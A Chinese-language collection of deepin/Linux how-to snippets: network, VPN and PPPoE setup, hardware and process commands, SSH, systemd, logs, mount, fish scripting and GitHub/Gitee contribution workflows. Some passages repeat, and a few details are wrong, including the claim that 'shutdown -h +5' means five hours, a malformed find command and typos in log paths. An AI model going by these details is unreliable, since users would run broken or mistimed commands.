检查Samba服务是否正常启用的步骤：1. 查看当前电脑IP地址，终端输入命令‘ifconfig’；2. 打开局域网内Windows系统电脑（虚拟机需为局域网模式），在‘我的电脑’地址栏输入‘file://xxx.xxx.xxx.xxx’（xxx.xxx.xxx.xxx为查到的IP地址）；3. 若能看到主机内的共享文件，说明Samba服务成功启用。

Samba的相关链接包括：官方文档（http://www.samba.org/samba/docs/）、维基百科:Samba（http://zh.wikipedia.org/zh-cn/Samba）、IMCN:怎样在 Ubuntu 12.04 中安装和设置 Samba 实现网上邻居共享（http://imcn.me/html/y2012/10717.html）。

标题：VPN
虚拟专用网（英语：Virtual Private Network，简称VPN），是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。虚拟私人网络的讯息透过公用的网络架构（例如：互联网）来传送内联网的网络讯息。它利用已加密的通道协议（Tunneling Protocol）来达到保密、传送端认证、信息准确性等私人信息安全效果。这种技术可以用不安全的网络（例如：互联网）来传送可靠、安全的信息。需要注意的是，加密信息与否是可以控制的。没有加密的虚拟专用网信息依然有被窃取的危险。

以日常生活的例子来比喻，虚拟专用网就像：甲公司某部门的A想寄信去乙公司某部门的B。A已知B的地址及部门，但公司与公司之间的信不能注明部门名称。于是，A请自己的秘书把指定B所属部门的信（A可以选择是否以密码与B通信）放在寄去乙公司地址的大信封中。当乙公司的秘书收到从甲公司寄到乙公司的信件后，该秘书便会把放在该大信封内的指定部门信件以公司内部邮件方式寄给B。同样地，B会以同样的方式回信给A。

直到20世纪90年代末，计算机网络上的计算机通过非常昂贵的专线和/或拨号连线互连。视站点间的距离，花费可达数千美元（56kbps连线）或上万美元（T1）。由于避免了租用多条各自连接互联网的专线的需要，虚拟私人网络可减少网络开支。用户可以安全地交换私密数据，这使昂贵的专线变得多余。

安全的虚拟私人网络使用加密穿隧协议，通过阻止截听与嗅探来提供机密性，还允许发送者身份验证，以阻止身份伪造，同时通过防止信息被修改提供消息完整性。 某些虚拟私人网络不使用加密保护数据。虽然虚拟私人网络通常都会提供安全性，但未加密的虚拟私人网络严格来说是不“安全”或“可信”的。例如，一条通过GRE协议在两台主机间创建的隧道属于虚拟私人网络，但既不安全也不可信。 除以上的GRE协议例子外，本地的明文穿隧协议包括L2TP（不带IPsec时）和PPTP（不使用微软点对点加密(MPPE)时）。

常用的虚拟专用网协议有：L2F、L2TP、PPTP、IPsec、SSL VPN、Cisco VPN、OpenVPN。

进入系统设置——网络——VPN网络，点击创建VPN，然后选择VPN的类型，并设置相应参数。需要填写的信息有:设置名称（连接方式的名称）、网关（VPN服务商提供的网关地址）、用户名（VPN账号用户名）、密码（VPN网络账号的密码）。VPN的类型请根据你的VPN网络选择，一般选择PPTP模式。如果你需要绑定IP，请点击IPv4或IPv6一栏中的“方法”，选择“手动”，即可进行设置。最后设置完成后，请点击保存，然后深度操作系统会自动尝试连接该网络模式。

虚拟专用网（英语：Virtual Private Network，简称VPN），是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。虚拟私人网络的讯息透过公用的网络架构（例如：互联网）来传送内联网的网络讯息。它利用已加密的通道协议（Tunneling Protocol）来达到保密、传送端认证、信息准确性等私人信息安全效果。这种技术可以用不安全的网络（例如：互联网）来传送可靠、安全的信息。需要注意的是，加密信息与否是可以控制的。没有加密的虚拟专用网信息依然有被窃取的危险。以日常生活的例子来比喻，虚拟专用网就像：甲公司某部门的A想寄信去乙公司某部门的B。A已知B的地址及部门，但公司与公司之间的信不能注明部门名称。于是，A请自己的秘书把指定B所属部门的信（A可以选择是否以密码与B通信）放在寄去乙公司地址的大信封中。当乙公司的秘书收到从甲公司寄到乙公司的信件后，该秘书便会把放在该大信封内的指定部门信件以公司内部邮件方式寄给B。同样地，B会以同样的方式回信给A。在以上例子中，A及B是身处不同公司（内部网路）的计算机（或相关机器），通过一般邮寄方式（公用网络）寄信给对方，再由对方的秘书（例如：支持虚拟专用网的路由器或防火墙）以公司内部信件（内部网络）的方式寄至对方本人。请注意，在虚拟专用网中，因应网络架构，秘书及收信人可以是同一人。许多现在的操作系统，例如Windows及Linux等因应所用传输协议，已有能力不用通过其它网络设备便能达到虚拟专用网连接。

常用的虚拟专用网协议有：- L2F- L2TP- PPTP- IPsec- SSL VPN- Cisco VPN- OpenVPN

下面我们简单介绍如何设置VPN网络环境。进入系统设置——网络——VPN网络，点击创建VPN，然后选择VPN的类型，并设置相应参数。需要填写的信息有:- 设置名称:这个为设置连接方式的名称,名称可以随便填写.- 网关:这个填写VPN服务商提供的网关地址.- 用户名:这个是指提供VPN账号用户名.- 密码:这个填写VPN网络账号的密码VPN的类型请根据你的VPN网络选择,一般选择PPTP模式。如果你需要绑定IP，请点击IPv4或IPv6一栏中的“方法”，选择“手动”，即可进行设置。最后设置完成后,请点击保存,然后深度操作系统会自动尝试尝试连接该网络模式。

标题：如何查看网卡信息
## 查看所有网络连接
终端输入：`nmcli connection show`

## 查看活动的网络连接
终端输入：`nmcli connection show -active`

## 查看指定网卡的信息
终端输入：`nmcli connection show enp2s0`
命令中的 `enp2s0` 为网卡名称

## 显示设备的连接状态
终端输入：`nmcli device status`

## 显示所有设备网络设备详情信息
终端输入：`nmcli device show`

## 显示指定网络设备的详细信息
终端输入：`nmcli device show enp2s0`
命令中的 `enp2s0` 为网卡名称

标题：拨号网络
拨号网络是国内家庭用户最常见的网络环境，下面我们简单介绍如何设置拨号网络。

图形设置拨号网络时，需进入系统设置——网络——DSL，点击“创建PPPoE网络”。

创建PPPoE网络需填写四类信息：名称（可随便填写，为该链接方式的名称）、用户名（拨号上网的账号）、服务（提供拨号服务的网络运营商，名称可随便填写）、密码（拨号上网账号的密码）。

进入系统设置——网络——DSL，点击“创建PPPoE网络”。我们需要填写的信息有:
- 名称:这个为设置该链接方式的名称,名称可以随便填写
- 用户名:这个填写你拨号上网的账号
- 服务:这个是指提供拨号服务的网络运营商,名称可以随便填写
- 密码:这个填写你拨号上网的账号的密码

如果你需要设置固定IP和DNS,请在IPv4一栏中点击“方法”，然后选择“手动”，即可看到IP和DNS设置栏。

最后设置完成后,请点击保存,然后深度操作系统会自动尝试链接网络。

拨号网络图形设置完成后，点击保存，深度操作系统会自动尝试链接网络。

命令设置PPPoE连接ADSL modem：打开终端，执行“sudo pppoeconf”，按文本配置导航一步步设置（一般点击“Yes”），在输入用户名和密码时填写电信局申请的帐号和密码，完成后网络通常可使用。

使用PPPoE 连接到ADSL modem,打开终端，执行下面命令：
    sudo pppoeconf

然后出现文本配置导航，一步步设置，一般点击“Yes”即可。在要求输入你的用户名和密码处填写在电信局申请的帐号和密码,待完成基本设置，一般网络就能用了。

连接已设置好的ADSL连接：
    sudo pon dsl-provider

断开ADSL连接：
    sudo poff dsl-provider

标题：有线网络
有线网络是最为常见的网络环境之一,下面我们简单介绍如何设置有线网络链接.

深度操作系统会自动检测当前的网络环境,一般有线网络环境,无需用户设置,系统就会自动设置完成.

如果遇到深度操作系统无法自动设置网络环境,那么需要我们自行设置,方法也很简单,进入系统设置——网络——有线网络——添加设置，然后填写MAC地址绑定地址即可。

如要了解设备的MAC地址，可以终端执行: ifconfig 

如果需要设置固定的IP地址和DNS，请在“IPv4”或者“IPv6”一栏中点击“方法”并勾选“手动”，即可进行设置(请根据你当前的网络环境选择IPV4或者IPV6环境)。

最后设置完成后,请点击保存,然后深度操作系统会自动尝试链接网络.

如果遇到深度操作系统无法自动设置网络环境,那么需要我们自行设置,方法也很简单,进入系统设置——网络——有线网络——添加设置，然后填写MAC地址绑定地址即可。如要了解设备的MAC地址，可以终端执行:
    ifconfig 
如果需要设置固定的IP地址和DNS，请在“IPv4”或者“IPv6”一栏中点击“方法”并勾选“手动”，即可进行设置(请根据你当前的网络环境选择IPV4或者IPV6环境)。
最后设置完成后,请点击保存,然后深度操作系统会自动尝试链接网络.

标题：移动网络
我国移动网络环境一般为3G、4G上网。

文中提及的移动网络设置方法可能不适合新版deepin，需用其他网络管理器（如Gnome network manager）配置。

设置移动网络第一步：打开“网络连接”，切换到“移动宽带”标签页，单击添加新的移动网络连接。

移动网络手动设置需选择国家地区（中国）、提供商，以及用户名和密码（询问销售商）。

配置完成移动网络后，点击右上角的宽带网络名称即可连接网络。

提示：China Moblile-中国移动，China Telecom-中国电信，China Unicom-中国联通。

若无法连接网络，需查看所购买的无线网卡是否支持Linux平台，不支持可咨询销售商或官方服务人员。

华为et127 3G网卡第一种情况：深度操作系统可以直接识别，无需设置。

华为et127 3G网卡第二种情况：需用usb-modeswitch和wvdial/gnome-ppp/网卡自带拨号程序，或不用usb-modeswitch（系统可识别3g网卡为modem时），wvdial/gnome-ppp为拨号程序。

3g网卡链接上移动网络后不能上网，需先断开有线网，终端执行：sudo ifconfig eth0 down。

设置默认网关为使用sudo wvdial获取的local IP address，如sudo route add default gw 10.150.129.135。

重启网络可在终端执行：sudo /etc/init.d/networking restart。

检查dns文件：ls -l /etc/resolv.conf，若指向/run/resolvconf/resolv.conf则跳过，否则执行sudo rm /etc/resolv.conf和sudo ln -s /run/resolvconf/resolv.conf /etc/resolv.conf建立软链接。

编辑dns文件：sudo gedit /etc/resolv.conf，添加nameserver 221.130.33.60和nameserver 221.130.33.52（为sudo wvdial获取的primary和secondary DNS address）。

编辑dns文件后执行sudo /etc/init.d/resolvconf restart，再重启网络。

以后使用3g网卡时，需执行sudo wvdial（拨号）、sudo ifconfig eth0 down（断开有线）、sudo route add default gw x.x.x.x（设置网关）。

若深度操作系统未识别3g网卡为modem，需一开始用sudo usb_modeswitch -W切换模式。

标题：方式一
Hardinfo是一款Linux系统信息查看软件，推荐使用。

CPU-G是一款linux下查看硬件信息的小软件，是Windows平台上CPU-Z的复刻版。

dmesg命令可查看所有启动时检测到的硬件信息。

lspci命令用于显示外设信息，如usb，网卡等信息。

uptime命令能给出当前时间、系统运行时间、当前登陆的用户数量、前1、5和15分钟系统的平均负载的一行显示。

inxi -F命令可列出所有硬件信息。

neofetch命令能在终端中显示系统Logo和信息。

screenfetch命令可在终端中显示系统Logo和信息。

Psensor是一款Linux下用于监控硬件温度的小软件。

标题：在终端中查看硬件参数
lscpu 用于获取CPU基本信息，包括架构，核心数，主频等。

lscpu -p 用于获取CPU详细信息，一般用不到。

lspci | grep -i vga 可查看设备上所有图形处理器信息。

lspci -k | grep -EA3 "VGA|3D|Display" 能查看当前图像输出显卡。

lsblk 用于查看硬盘基本参数及分区信息。

sudo lshw -C disk 可查看每块硬盘的具体参数，包括序列号、型号、挂载点等。

hdparm 用于查看Sata设备信息。

lsscsi 用于查看SCSI设备信息。

free -g 和 meminfo 可用于查看内存信息。

lspci | grep Ethernet 用于查看网卡信息。

dmidecode | more 用于查看主板信息。

标题：硬件信息获取
内核默认加载的dmi sysfs保存在/sys/class/dmi文件夹中，含bios、board、product等信息。

执行ls -l /sys/class/dmi/id/bios_*可查看支持的bios字段，包括bios_date,bios_vendor,bios_version，用cat命令查看，部分需root权限。

执行ls -l /sys/class/dmi/id/board*可查看支持的board字段，包括board_asset_tag,board_serial,board_version,board_name,board_vendor。

执行ls -l /sys/class/dmi/id/product*可查看支持的product字段，包括product_family，product_serial，product_uuid，product_name，product_sku，product_version。

执行cat /proc/cpuinfo可获取cpu信息，model name字段为cpu名称，如cat /proc/cpuinfo | grep 'model name'。

执行cat /proc/meminfo可获取内存信息，如cat /proc/meminfo | grep MemTotal获取总大小。

硬盘信息用lsblk获取，可指定参数，如lsblk -J -bno NAME,SERIAL,TYPE,SIZE,VENDOR,MODEL,MOUNTPOINT,UUID，参数看lsblk -h。

标题：进程管理
在Linux系统上，用户工作、系统监控程序等都以进程形式运行，进程管理是Linux系统管理的重要方面。

深度操作系统自带系统监视器，可方便管理进程。

ps命令用于显示瞬间进程动态，语法为ps [options] [--help]，常用参数有-A（列出所有进程）、-w（显示加宽）、-au（显示详细资讯）、-aux（显示所有包含其他使用者的进程）。

pstree将所有进程以树状图显示，以pid或init为根，指定用户id则只显示该用户进程，语法为pstree [-a] [-c] [-h|-Hpid] [-l] [-n] [-p] [-u] [-G|-U] [pid|user] 等，-a参数显示进程完整指令及参数。

top命令实时显示进程动态，语法为top [-] [d delay] [q] [c] [S] [s] [i] [n] [b]，d参数改变显示更新速度，q参数无延迟显示。

kill命令杀死执行中的程序或工作，默认信息为SIGTERM(15)，可强制用SIGKILL(9)，语法为kill [-s <信息名称或编号>][程序] 或 kill [-l <信息编号>]，-l参数列出全部信息名称。

killall向所有运行指定命令的进程发送信号，默认SIGTERM，语法为killall [-egiqvw] [-signal] name ... 等，-i参数为交互方式，杀死前征求确认。

pkill可杀死运行中的程序，能杀死指定用户所有进程，应用方法为pkill正在运行的程序名。

xkill用于杀死桌面图形界面程序，终端执行xkill后，图标点击崩溃程序即可，右键取消。

nice以更改过的优先序执行程序，默认调整值10，范围-20（最高）到19（最低），语法为nice [-n adjustment] [-adjustment] [--adjustment=adjustment] [--help] [--version] [command [arg...]]。

crontab用于定期执行Linux程序，语法为crontab [ -u user ] file 或 crontab [ -u user ] { -l | -r | -e }，-e参数执行文字编辑器设定时程表，-r删除时程表，-l列出时程表。时程表格式为f1（分钟）f2（小时）f3（日）f4（月）f5（星期）program。

at让用户指定在特定时刻执行程序或指令，TIME格式为HH:MM等，可指定am、pm等，输入完指令按ctrl+D完成，语法为at -V [-q queue] [-f file] [-mldbv] TIME，-f参数读入预先写好的命令档。

标题：时间和时区
Linux时钟分为系统时钟和硬件时钟。硬件时钟是主板上电池供电的时钟，仅保存年、月、日、时、分、秒；系统时钟是Linux Kernel中的时钟，保存时间、时区和夏令时设置，内核保存为自UTC 1970年1月1日经过的秒数。

时间表示有UTC和localtime两个标准。UTC是与时区无关的全球时间标准；localtime依赖当前时区。Windows默认用localtime，Mac OS默认用UTC，UNIX系列两者都有。Linux建议将硬件时钟设为UTC。

timedatectl可查看和设置时间，如timedatectl status显示硬件和系统时间，timedatectl set-time "2012-10-30 18:17:16"设置系统时间。

date命令可显示和设置系统时间，管理员有权限设置，普通用户只能查看。如date显示当前时间，date -s "20100618 12:00:00"设置时间。

hwclock和clock用于硬件时钟操作，--show显示硬件时间，--set --date设置硬件时间，--hctosys将系统时钟与硬件时钟同步，--systohc将硬件时钟与系统时钟同步。

tzselect可设置时区，如设置北京时间需依次选择亚洲、中国、华东地区（北京等），确认后使用TZ='Asia/Shanghai'。

timedatectl可检查时区（status）、显示可用时区（list-timezones）、修改时区（set-timezone <Zone>/<SubZone>）。

深度操作系统默认不启用UTC，若启用会与Windows时差8小时。修改/etc/default/rcS，将UTC=yes改为no，重启生效。

NTP用于同步计算机时间，安装命令sudo apt-get install ntp，配置文件/etc/ntp.conf，重启服务sudo service ntp restart，检查同步用sudo ntpq -c lpeer。

标题：SSH服务
SSH为Secure Shell的缩写，是建立在应用层和传输层基础上的安全协议，为远程登录会话和其他网络服务提供安全性，可防止远程管理中的信息泄露。

SSH分客户端openssh-client和openssh-server。仅登录其他机器的SSH需安装openssh-client，深度操作系统默认安装，未安装可执行sudo apt-get install openssh-client；使本机开放SSH服务需安装openssh-server，执行sudo apt-get install openssh-server。

使用ssh-keygen命令生成一对私钥和公钥；向服务器发送自己的公钥可实现无密码登录，命令为ssh-copy-id username@xxx.xxx.xxx.xxx（username和xxx.xxx.xxx.xxx替换成登录服务器的用户名和IP）。

卸载SSH客户端和服务器的命令分别为sudo apt-get remove openssh-client和sudo apt-get remove openssh-server。

执行ps -e |grep ssh可确认sshserver是否启动，看到sshd说明已启动；未启动可执行sudo /etc/init.d/ssh start或service ssh start启动。

ssh-server配置文件位于/etc/ssh/sshd_config，可定义SSH服务端口，默认端口22；修改后需重启SSH服务，命令为sudo /etc/init.d/ssh stop和sudo /etc/init.d/ssh start。

登录SSH的命令为ssh username@192.168.1.112，其中username为目标机器上的用户，需输入密码。

使用w命令可查看当前登录的用户，其列选项包括USER、TTY、FROM、LOGIN@、IDLE、JCPU、PCPU、WHAT；使用pkill -kill -t [TTY]可强制注销指定登录用户，[TTY]为终端名。

SSH相关链接包括官方网站http://www.openssh.org/和Linux下查看已登录用户及pkill强制退出命令的链接http://wangye.org/blog/archives/343/。

标题：Systemd
Systemd是用户级应用程序，包含完整软件包，配置文件在/etc/systemd，配置工具命令在/bin、/sbin，备用配置文件在/lib/systemd。

Systemd提供强大命令行工具systemctl，也提供service、chkconfig命令，本质重定向至systemctl。

通过systemctl启动服务用start选项，.service后缀可省略，如systemctl start lightdm。

重启服务可用restart（运行则重启，未运行则启动）、try-start（仅运行时重启）、reload（重新加载配置文件）选项。

停止正在启动的服务使用systemctl的stop选项，如systemctl stop lightdm。

启用服务（开机自启动）用enable，禁用用disable，不改变当前状态，重启后生效。

查看服务运行状态使用systemctl的status选项，如systemctl status lightdm。

systemctl可管理电源：poweroff（关机）、reboot（重启）、suspend（待机）、hibernate（休眠）、hybrid-sleep（混合休眠）。

标题：系统服务入门
系统提供的服务（service）需通过程序运行，该程序称为daemon，二者可视为相同，无daemon则无service。

按启动与管理方式，daemon分两类：stand alone可独立启动，常驻内存，响应快，如httpd、vsftpd；super daemon统一管理，无请求时服务未启动，有请求才唤醒，如xinetd管理telnet。

super daemon管理的服务机制优点：有安全控管功能，服务不常驻内存节省资源；缺点：客户端请求时唤醒服务，响应较慢。

super daemon处理模式分两种：multi-threaded（多重线程）可同时处理多个客户端请求；single-threaded（单个线程）需排队处理，一个完成再处理下一个。

按工作状态，daemon分signal-control（受讯号管理，有客户端需求立即启动，如cupsd）和interval-control（每隔一段时间主动运行，如atd、crond）。

服务命名通常在名称后加d，代表daemon，如at的程序文件为atd，cron的为crond。

daemon启动脚本多在/etc/init.d/（CentOS实际在/etc/rc.d/init.d/，有链接），初始化环境配置文件在/etc/sysconfig/。

super daemon配置文件：主配置文件为/etc/xinetd.conf，管理的其他daemon配置在/etc/xinetd.d/。

常见服务中，cron是任务调度系统，建议开启；atd类似cron，建议关闭；syslog-ng是系统日志，建议开启。

chkconfig是命令行服务管理工具，可启用和禁用系统服务，语法为chkconfig [--add][--del][--list][系统服务]或chkconfig [--level<等级代号>][系统服务][on/off/reset]。

Linux操作环境分7个等级，0为开机（不建议切换），1为单人使用者文字界面，2为多人文字界面（无NFS），3为多人文字界面（有NFS），4为部分发行版x windows，5为部分发行版x windows，6为重新启动。

service命令用于管理系统服务，可进行启动（start）、停止（stop）、重启（restart）、查看状态（status）等操作，语法为service service name 命令 [选项]。

标题：Linux系统服务配置文件入门
Linux系统中，配置文件控制用户权限、系统应用程序等管理任务。几乎每个程序的行为都可通过修改其配置文件定制。

Linux中没有标准的配置文件格式。每个程序员可自由选择喜欢的格式，从简单的换行分隔列表到复杂格式不等。

内核需配置文件了解用户和组列表，管理文件权限。程序应调用系统库函数（如getpw()）获取用户密码，而非直接打开/etc/passwd。

系统中大多数配置文件在/etc目录，大致分为文件系统、系统命令、守护进程、用户程序等类别。

/proc是虚拟文件系统，提供内核数据结构接口，如/proc/modules列举当前加载的模块，lsmod命令读取其信息并显示。

守护进程是非交互模式运行的程序，多与联网相关，如Web服务器、ftp服务器等，等待连接提供服务。

更改配置文件后，若程序不由系统管理员或内核控制，需重启使用该配置的程序。普通用户通常无权限启停系统程序和守护进程。

更改内核配置文件立即影响系统，如修改passwd文件增加用户立即生效。/proc/sys目录有内核可调参数，仅超级用户可写。

多数守护进程不会自动重新加载配置文件，需告知其更改，可在Red Hat系统用service命令重启服务，如service network restart。

用户程序多有两个配置文件：系统级在/etc/，用户专用在主目录，如wget的/etc/wgetrc和/home/xxx/.wgetrc，前者为缺省值，后者为用户定制。

标题：系统日志
日志文件能记录系统事件，帮助检查错误原因和追踪攻击者踪迹，主要功能是审计和监测，还能实时监测系统状态及追踪侵入者。

Linux系统有3个主要日志子系统：连接时间日志、进程统计日志和错误日志。连接时间日志由多个程序执行，记录写入/var/log/wtmp和/var/run/utmp；进程统计日志由系统内核执行，进程终止时写入pacct或acct；错误日志由sysogd(8)执行，向/var/og/messages报告事件。

日志消息级别从0到7，0是EMERG（紧急，主机不可用），1是ALERT（警告，需立即处理），2是CRIT（严重），3是ERR（错误），4是WARNING（提醒），5是NOTICE（注意），6是INFO（信息），7是DEBUG（调试）。

/var/log/messages包含整体系统信息，包括启动期间日志及mail、cron等内容；/var/log/dmesg包含内核缓冲信息，启动时显示硬件相关信息，可用dmesg查看。

/var/log/auth.log包含系统授权信息，如用户登录和权限机制；/var/log/boot.log包含系统启动时的日志；/var/log/daemon.log包含各种系统后台守护进程日志信息。

/var/log/kern.log包含内核产生的日志，有助于定制内核时解决问题；/var/log/lastlog记录所有用户的最近信息，需用lastlog命令查看；/var/log/maillog 和 /var/log/mail.log包含电子邮件服务器的日志信息。

/var/log/btmp记录所有失败登录信息，可用last -f /var/log/btmp | more查看；/var/log/cron记录cron进程开始工作的相关信息；/var/log/secure包含验证和授权方面信息，如sshd的相关记录。

systemd-analyze命令可记录系统启动耗时详情，用systemd-analyze plot > start_analyze.svg输出图形，用systemd-analyze blame获得进程耗时排名。

who命令显示当前本地系统用户信息，包括登录名、tty、登录日期和时间等。who am i 或 whoami显示自己的登录信息，远程登录会显示主机名。

w命令显示目前登入系统的用户信息及他们正在执行的程序，可指定用户查看；last命令读取/var/log/wtmp文件，列出目前与过去登入系统的用户信息。

lastlog命令报告所有用户或指定用户的最近登录情况，有-b、-t等选项，分别用于显示老于或新于指定天数的登录记录。

标题：du查看空间
查看文件大小可以使用du -ha 文件名命令。

查看目录总大小可执行du -hs 目录名命令。

du -hs *命令可查看当前目录下所有内容的大小。

du命令中-h参数表示人类可读。

du命令的-s参数用于展示当前目录所占全部大小，不显示子目录空间。

du命令的-a参数能展示一个文件所占大小。

标题：grep和find命令
linux 中查找东西，最常用的就是 grep 和 find。grep 是处理文件内容，而 find 是查找文件。

grep 有两种使用场景，一种是对其他命令的输出做处理，搜索管道来的数据。一种是对文件系统中的文件内容进行查找。

ls | grep wps 可查找当前目录下的文件名字。

lspci -k | grep VGA -A2 可查询显卡的驱动。

grep -c sse /proc/cpuinfo 可查看 cpu 支持什么指令集。

find 命令可以根据给定的路径和表达式查找文件或目录, 支持正则，不加任何参数表示查找当前路径下的所有文件和目录。

find 常用参数有 -name（按名称查找）、-size（按大小查找）、-user（按属性查找）、-type（按类型查找）、-iname（忽略大小写）。

find -name ./ "*.txt 可在当前目录下搜索名称后缀为 .txt 的所有文件名。

find -size ./video +1M 可在当前 video 目录下搜索所有文件大小大于 1M 的文件。

标题：mount挂载命令
Linux将一切作为文件管理，硬件设备、磁盘分区等需挂载到目录才能操作，根目录始终挂载，Unix文件系统可对应文件而非必是硬件。

挂载点是磁盘文件系统或设备的入口目录，Linux用唯一树形结构管理文件，各文件系统挂载于树形结构的挂载点，根目录/是唯一必须挂载的。

FHS是Linux目录布局标准，核心是文件的可共享vs不可共享、静态vs变量特征，使文件存储更合理，根文件系统需包含启动等必要文件。

/bin存放用户常用命令，静态且不可共享；/boot存放系统内核及启动文件，如vmlinuz、initrd和grub目录，静态且不可共享。

/dev存放设备文件，如/dev/sda代表第一块IDE硬盘，静态且不可共享；/etc存放系统管理配置文件和子目录，静态且不可共享。

mount命令可加载设备文件系统到Linux目录，语法为mount [参数] [设备名] [加载点]，-a加载/etc/fstab中所有设备，-t指定文件系统类型。

mount的-o选项可指定加载选项，如ro（只读）、rw（可读写）、uid（指定用户ID）等，defaults包含rw、suid等默认选项。

umount命令卸除挂载的文件系统，语法为umount [参数] [文件系统]，-a卸除/etc/mtab中所有文件系统，-l可进行lazy umount。

/etc/fstab记录默认加载的文件系统信息，包括设备、挂载点、类型、选项等，格式为“文件系统 挂载点 类型 选项 转储 fsck”。

降低SWAP使用率可修改/etc/sysctl.conf中的vm.swappiness值，内存大于1GB时建议设为10或5，默认可能为60。

深度系统不默认挂载Win分区，因Windows快速启动可能导致数据丢失，Win分区错误或有保护软件可能影响启动。

不能挂载特定Win分区可能因未关闭Windows8快速启动、分区有数据保护/网盘软件，或硬盘分区表有问题。

标题：shutdown关机命令
shutdown -h now 是立刻关机的命令。

shutdown -r now 可实现立刻重启，等价于 reboot 命令。

shutdown -h 20:01 用于设置到晚上8点1分时关机。

shutdown -h +5 表示5小时后关机。

标题：fish脚本编程
fish shell比bash更人性化，智能体验和文字样式无需配置即可使用，有自己的脚本语言，与bash不兼容。

fish中查看命令帮助可使用man命令，如man set。

fish中，文件存在时文字显示蓝色，不存在时显示红色。

fish中，*匹配文件名的全部或一部分，**匹配当前目录下所有路径的全部或一部分。

fish中，|将左命令标准输出重定向到右命令标准输入；>重定向输出到文件，2>指定标准错误输出，>&1表示输出到标准输出。

fish中，敲击命令时会提示补充词，按ctrl + f或右箭头完成单词，alt + ->局部完成；tab键激活命令、参数、路径提示。

fish中，alt + 左右箭头可进入上一个或下一个目录。

fish中，用$变量名读取变量值，set 变量名 变量值设置变量值；双引号内可使用变量，单引号内不能。

fish中，set -e 变量名撤销变量，set -x 变量名 变量值设置导出变量（子脚本可读取），set -u 变量名撤销导出变量。

fish中，变量是列表，set a $a b往$a添加项b；count $a获取列表长度，$a[1]取第1项，$a[-1]取末尾项。

fish中，(命令)执行括号内命令，输出作为参数插入，如echo (uname)；$status表示上一个命令的返回值，0为成功。

fish中，数字运算用math命令，如math -s0 1+1；支持+、-、x、/、^、%等运算，-s0保留整数。

fish中，判断语句用if...else if...else...end；test命令可判断，如test "$number" -gt 5判断是否大于5。

fish中，switch...case语句根据$a的值控制分支，case '*'表示默认选项。

fish中，while true实现死循环；for file in *.txt依次读取txt文件列表执行循环体。

fish中，用function 函数名...end定义函数，参数通过$argv获取，如function say; echo hello $argv; end。

fish中，string join命令指定联接符联接字符串，如echo a\nb\nc | string join ' '输出a b c。

fish中，abbr -ag ll ls -l将ls -l用ll缩写代替；alias ll="ls -l"用ll函数包装ls -l。

标题：代码评审流程
当拉取请求（Pull Request）创建后，仓库维护人员和自动化流水线可对代码变动进行评审，有修改意见需贡献者修改，问题解决后维护人员可合并代码。

代码评审在拉取请求的Files Changed页面进行，可在代码行左侧点蓝色加号评注，有Start a review（pending状态，需Submit review提交）和Add single comment（立即添加）两种方式。

评注后点击右上角Review Changes按钮，选择评审结果提交。结果有三种：Approve（通过，相当于gerrit的+2）、Request change（请求修改，相当于gerrit的-1）、Comment（仅做评论）。

具有推送（Push/Write）权限的人员的Approve为有效Approval。deepin相关项目至少需要一个有效的Approval，足够Approval后项目维护者可合并。

标题：常规 Pull Request 代码贡献流程
向GitHub项目贡献代码通常使用Fork + Pull Request流程：先派生仓库，在复刻仓库修改，再发起拉取请求，经评审后合并。

上游仓库指希望贡献代码的原始仓库，如linuxdeepin组织下的dde-file-manager仓库。

创建派生复刻仓库需通过GitHub的Fork功能，在自己账户下生成关联仓库，如username的dde-file-manager仓库。

应克隆自己的派生仓库到本地，在其中修改代码，修改后推送到派生仓库会看到创建PR的提示。

建议将上游仓库添加为remote以便更新代码，如git remote add upstream [上游仓库地址]。

强烈建议在新的本地分支进行代码变更，方便主线分支更新。

推送本地修改分支到origin后，在GitHub会看到创建PR的提示，点击可进入创建界面填写信息提交。

PR创建后，可在页面查看评论、CI检查和review状态，邀请有maintain权限的组员评审，获Approve后可合入。

代码有问题无需关闭PR，可在原分支推送新提交或覆盖原有提交，会自动更新PR并重新触发检查。

标题：现有 Action 工作流用法概要
GitHub Action 是 GitHub 开发流程中提供自动化 CI/CD 的组件之一，开源项目会配置工作流辅助开发，如自动打包构建等。

拉取请求（PR）中的 PR 状态显示在拉取请求最下方，每一行对应不同 Job 检查，点击右侧 Details 可进入详情页面查看日志。

已推送的提交的 Action 检查，可通过点击 commit 旁的对号或错号展开详情，点击 Details 进入检查详情页面。

从上述位置点击 Details 进入对应 Job 的日志页面，每个 Job 分多个步骤执行，步骤在右侧显示为一组，可展开查看日志输出。

在日志页面左侧上半部分有 Summary 链接，点击进入概览页面，展示工作流执行状况、汇总信息及产生的资产（Artifacts）。

在仓库的 Actions 标签中可查看所有已执行的 Action 工作流，有助于故障排查，仓库管理人员可在此手动触发工作流。

在日志中搜索内容时，请使用页面提供的搜索框，而不是 Ctrl+F。

登录状态下，可在包含资产的 Action 概览页面下载对应的资产以供使用。

标题：远程代码托管平台--GitHub和Gitee的使用
代码托管中心用于实现团队协作，包括团队内协作和跨团队协作。

团队内协作（A和B）步骤：A push本地库到远程库；B clone远程库到本地库；B获授权后push修改到远程库；A pull更新本地库。

跨团队协作（A和B团队）步骤：B fork A的远程库；B clone自己的远程库；B push修改到自己的远程库；B发pull request；A审核后merge并pull。

常见代码托管平台：GitHub（开源及私有项目托管）、Gitee（国内版GitHub）、Gitlab（公司内部私有托管）。

国内访问GitHub的方法：梯子（不建议，违法等）、游戏加速器（不稳定）、镜像站、本地代理直连加速、出国。

GitHub创建远程仓库：登录账号，点击右上角+号选New repository，填写名称，建议设为公开。

为GitHub远程库创建别名：复制HTTPS地址，用git remote add 别名 地址，git remote -v查看。

推送本地库到GitHub远程库：用git push 别名 分支名，登录账号即可。

拉取GitHub远程库到本地库：使用git pull 仓库别名 分支名命令。

克隆GitHub远程库到本地库：用git clone 链接，会拉取代码、初始化本地库、创建origin别名。

GitHub SSH免密登录：生成公钥（ssh-keygen -t rsa -C 邮箱，三次回车），复制id_rsa.pub内容，添加到GitHub的SSH and GPG keys。

Gitee是国内基于Git的代码托管平台，中文界面，网址为Gitee - 基于 Git 的代码托管和研发协作平台。

Gitee创建远程仓库：需先设为私有，推送一定代码后可申请公开。

Gitee的推送、拉取、克隆操作与GitHub相同。

Gitee SSH免密登录：使用已生成的id_rsa.pub在Gitee设置中添加SSH公钥。

Gitee导入GitHub仓库：新建仓库，点击导入已有仓库，输入GitHub仓库HTTPS网址，可刷新同步。

标题：Linux知识点总结
Linux知识点总结包含基础篇、帮助命令等多个部分。

